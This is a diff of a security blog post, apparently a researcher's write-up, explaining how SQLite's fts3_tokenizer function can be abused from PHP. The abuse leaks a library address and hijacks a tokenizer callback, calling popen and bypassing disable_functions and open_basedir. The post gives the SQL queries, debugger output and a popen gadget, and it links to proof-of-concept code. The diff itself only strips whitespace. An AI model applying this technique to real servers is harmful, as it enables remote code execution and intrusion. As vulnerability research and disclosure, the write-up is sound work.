@@ -5,7 +5,7 @@ date:	2016-01-20
 image: /img/bad-tokenizer.png
 show_excerpt: true
 ---
-  
+
 As a pentester, once you own a webshell you may need to get more access by running extra programs. But `disable_functions` may stop you from invoking system commands and probably `open_basedir` was set as well. PHP doesn't actually have a sandbox, so these restrictions have no effect on native code. If there were a bug that leads to code execution, the access control policies are broken. For example, [this exploit](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/writeup.md) abuses an use after free bug to bypass them.
 
 <!-- more -->
@@ -27,19 +27,19 @@ A custom FTS3 tokenizer should implement the following callbacks:
 These callbacks are registered in a `sqlite3_tokenizer_module` struct, declared as follow:
 
 ```c
-struct sqlite3_tokenizer_module {  
- int iVersion;  
- int (*xCreate) (int argc, const char * const *argv, sqlite3_tokenizer **ppTokenizer);  
- int (*xDestroy) (sqlite3_tokenizer *pTokenizer);  
- int (*xOpen) (sqlite3_tokenizer *pTokenizer, const char *pInput, int nBytes, sqlite3_tokenizer_cursor **ppCursor);  
- int (*xClose) (sqlite3_tokenizer_cursor *pCursor);  
+struct sqlite3_tokenizer_module {
+ int iVersion;
+ int (*xCreate) (int argc, const char * const *argv, sqlite3_tokenizer **ppTokenizer);
+ int (*xDestroy) (sqlite3_tokenizer *pTokenizer);
+ int (*xOpen) (sqlite3_tokenizer *pTokenizer, const char *pInput, int nBytes, sqlite3_tokenizer_cursor **ppCursor);
+ int (*xClose) (sqlite3_tokenizer_cursor *pCursor);
  int (*xNext) (sqlite3_tokenizer_cursor *pCursor, const char **ppToken, int *pnBytes, int *piStartOffset, int *piEndOffset, int *piPosition);
 };
 ```
 
 When the tokenizer is ready, we should register it to the SQLite.
 
-> FTS does not expose a C-function that users call to register new tokenizer types with a database handle. Instead, the pointer must be encoded as an SQL blob value and passed to FTS through the SQL engine by evaluating a special scalar function, `fts3_tokenizer()`. The `fts3_tokenizer()` function may be called with one or two arguments, as follows: `SELECT fts3_tokenizer(<tokenizer-name>);  
+> FTS does not expose a C-function that users call to register new tokenizer types with a database handle. Instead, the pointer must be encoded as an SQL blob value and passed to FTS through the SQL engine by evaluating a special scalar function, `fts3_tokenizer()`. The `fts3_tokenizer()` function may be called with one or two arguments, as follows: `SELECT fts3_tokenizer(<tokenizer-name>);
 SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>)`;
 > Where is a string identifying the tokenizer and is a pointer to an `sqlite3_tokenizer_module` structure encoded as an SQL blob. If the second argument is present, it is registered as tokenizer and a copy of it returned. If only one argument is passed, a pointer to the tokenizer implementation currently registered as is returned, encoded as a blob. Or, if no such tokenizer exists, an SQL exception (error) is raised.[1]You may notice that there's a security warning in SQLite's official document. Actually we can abuse `fts3_tokenizer` to execute arbitrary code, and even break a modern system protection.
 
@@ -54,13 +54,13 @@ select hex(fts3_tokenizer('simple'));
 In [ext/fts3/fts3.c](https://github.com/mackyle/sqlite/blob/c37ab9dfdd94a60a3b9051d2ef54ea766c5d227a/ext/fts3/fts3.c#L5876-L5877) it loads the built-in tokenizers into a hash table. The address comes from `libsqlite3`'s `.bss` section and refers to this:
 
 ```c
-static const sqlite3_tokenizer_module simpleTokenizerModule = {  
+static const sqlite3_tokenizer_module simpleTokenizerModule = {
  0,
- simpleCreate, 
+ simpleCreate,
  simpleDestroy,
- simpleOpen, 
+ simpleOpen,
  simpleClose,
- simpleNext,  
+ simpleNext,
 };
 ```
 
@@ -80,32 +80,32 @@ create virtual table a using fts3(tokenize=mytokenizer);
 Use a debugger to view the context:
 
 ```
-[---------------------code---------------------]  
-RAX: 0x4141414141414141 (b'AAAAAAAA')  
-RBX: 0x0   
-RCX: 0x0   
-RDX: 0x7fffffffc620 --> 0x0   
-RSI: 0x0   
-RDI: 0x0   
-RBP: 0x0   
-RSP: 0x7fffffffc4e0 --> 0x3   
-RIP: 0x7ffff7bab71c (call QWORD PTR [rax+0x8])  
-R8 : 0x55555579b968 --> 0x656c706d6973 (b'simple')  
-R9 : 0x0   
-R10: 0x0   
-R11: 0x1   
-R12: 0x0   
-R13: 0x8   
-R14: 0x7fffffffc514 --> 0x2e1ef00000000006   
-R15: 0x555555799f78 --> 0x7ffff7bb39e4 --> 0x746e65746e6f63 (b'content')  
-[---------------------code---------------------]  
- 0x7ffff7bab712: mov edi,ebx  
- 0x7ffff7bab714: mov rdx,QWORD PTR [rsp+0x10]  
- 0x7ffff7bab719: mov rsi,r12  
-=> 0x7ffff7bab71c: call QWORD PTR [rax+0x8]  
- 0x7ffff7bab71f: test eax,eax  
- 0x7ffff7bab721: mov ebx,eax  
- 0x7ffff7bab723: jne 0x7ffff7bab790  
+[---------------------code---------------------]
+RAX: 0x4141414141414141 (b'AAAAAAAA')
+RBX: 0x0
+RCX: 0x0
+RDX: 0x7fffffffc620 --> 0x0
+RSI: 0x0
+RDI: 0x0
+RBP: 0x0
+RSP: 0x7fffffffc4e0 --> 0x3
+RIP: 0x7ffff7bab71c (call QWORD PTR [rax+0x8])
+R8 : 0x55555579b968 --> 0x656c706d6973 (b'simple')
+R9 : 0x0
+R10: 0x0
+R11: 0x1
+R12: 0x0
+R13: 0x8
+R14: 0x7fffffffc514 --> 0x2e1ef00000000006
+R15: 0x555555799f78 --> 0x7ffff7bb39e4 --> 0x746e65746e6f63 (b'content')
+[---------------------code---------------------]
+ 0x7ffff7bab712: mov edi,ebx
+ 0x7ffff7bab714: mov rdx,QWORD PTR [rsp+0x10]
+ 0x7ffff7bab719: mov rsi,r12
+=> 0x7ffff7bab71c: call QWORD PTR [rax+0x8]
+ 0x7ffff7bab71f: test eax,eax
+ 0x7ffff7bab721: mov ebx,eax
+ 0x7ffff7bab723: jne 0x7ffff7bab790
  0x7ffff7bab725: mov rax,QWORD PTR [rsp+0x10]
 
 ```
@@ -119,15 +119,15 @@ R15: 0x555555799f78 --> 0x7ffff7bb39e4 --> 0x746e65746e6f63 (b'content')
  rc = SQLITE_ERROR;
  }else{
  char const **aArg = 0;
- 
+
  //...lines omitted...
 
  rc = m->xCreate(iArg, aArg, ppTok);
- assert( rc!=SQLITE_OK || *ppTok );  
- if( rc!=SQLITE_OK ){  
- sqlite3Fts3ErrMsg(pzErr, "unknown tokenizer");  
+ assert( rc!=SQLITE_OK || *ppTok );
+ if( rc!=SQLITE_OK ){
+ sqlite3Fts3ErrMsg(pzErr, "unknown tokenizer");
 ```
-   
+
 Assume the virtual table named *fulltext* has already been created successfully. This query triggers `xOpen` callback with the string "text goes here" as the `pInput1` parameter:
 
 ```
@@ -137,8 +137,8 @@ insert into fulltext values("text goes here");
 Sources in `ext/fts3/fts3_expr.c`, function `sqlite3Fts3OpenTokenizer`:
 
 ```c
-sqlite3_tokenizer_module const *pModule = pTokenizer->pModule;  
-sqlite3_tokenizer_cursor *pCsr = 0;  
+sqlite3_tokenizer_module const *pModule = pTokenizer->pModule;
+sqlite3_tokenizer_cursor *pCsr = 0;
 int rc;**rc = pModule->xOpen(pTokenizer, z, n, &pCsr);
 ```
 
@@ -167,10 +167,10 @@ The SQLite3 extension is enabled by default as of PHP 5.3.0. It's possible to di
 
 PHP does not come with PIE, but apache2 does. PHP interpreter is loaded as a shared object (`mod_php.so`) in Apache2's worker processes, who have full protection enabled.
 
-> CANARY : ENABLED  
-> FORTIFY : ENABLED  
-> NX : ENABLED  
-> PIE : ENABLED  
+> CANARY : ENABLED
+> FORTIFY : ENABLED
+> NX : ENABLED
+> PIE : ENABLED
 > RELRO : FULL
 
 Without a proper gadget for stack pivoting, sadly I only have one chance to call. *xOpen* looks good for PC-control. Its second param is a string from SQL which can be fully controlled.
@@ -183,16 +183,16 @@ Here's a gadget to call `popen`:
 
 ```
 .text:00000000002F137A mov rbx, rsi
-.text:00000000002F137D lea rsi, aRbLR+5 ; modes  
-.text:00000000002F1384 sub rsp, 58h  
-.text:00000000002F1388 mov [rsp+88h+var_74], edi  
+.text:00000000002F137D lea rsi, aRbLR+5 ; modes
+.text:00000000002F1384 sub rsp, 58h
+.text:00000000002F1388 mov [rsp+88h+var_74], edi
 .text:00000000002F138C mov rdi, rbx ; command
-.text:00000000002F138F mov [rsp+88h+var_58], rdx  
-.text:00000000002F1394 mov rax, fs:28h  
-.text:00000000002F139D mov [rsp+88h+var_40], rax  
-.text:00000000002F13A2 xor eax, eax  
-.text:00000000002F13A4 mov [rsp+88h+var_50], rcx  
-.text:00000000002F13A9 mov [rsp+88h+var_48], 0  
+.text:00000000002F138F mov [rsp+88h+var_58], rdx
+.text:00000000002F1394 mov rax, fs:28h
+.text:00000000002F139D mov [rsp+88h+var_40], rax
+.text:00000000002F13A2 xor eax, eax
+.text:00000000002F13A4 mov [rsp+88h+var_50], rcx
+.text:00000000002F13A9 mov [rsp+88h+var_48], 0
 .text:00000000002F13B2 call _popen
 ```
 
@@ -236,8 +236,8 @@ The exploit requires two requests. The former leak the address and generate a `.
 
 Here's the test environment.
 
-> Linux ubuntu 3.19.0-44-generic #50-Ubuntu SMP Mon Jan 4 18:37:30 UTC 2016 x86_64  
-> Apache/2.4.10 (Ubuntu)   
+> Linux ubuntu 3.19.0-44-generic #50-Ubuntu SMP Mon Jan 4 18:37:30 UTC 2016 x86_64
+> Apache/2.4.10 (Ubuntu)
 > PHP Version 5.6.4-4ubuntu6.4
 
 POC source code:
@@ -250,10 +250,9 @@ https://asciinema.org/a/7tj88jfqb0xg6bdnjsu427fkx
 
 ## References:
 
-[1]. [SQLite FTS3 and FTS4 Extensions](https://sqlite.org/fts3.html#section_8_1)  
-[2]. [PHP: SQLite3 Installation](http://php.net/manual/en/sqlite3.installation.php)  
+[1]. [SQLite FTS3 and FTS4 Extensions](https://sqlite.org/fts3.html#section_8_1)
+[2]. [PHP: SQLite3 Installation](http://php.net/manual/en/sqlite3.installation.php)
 [3]. [How to Change Configuration Settings](http://php.net/manual/en/configuration.changes.php)
 
 中文版：[特性还是漏洞？滥用 SQLite 分词器](http://blog.chaitin.com/abusing_fts3_tokenizer/)
 
-  
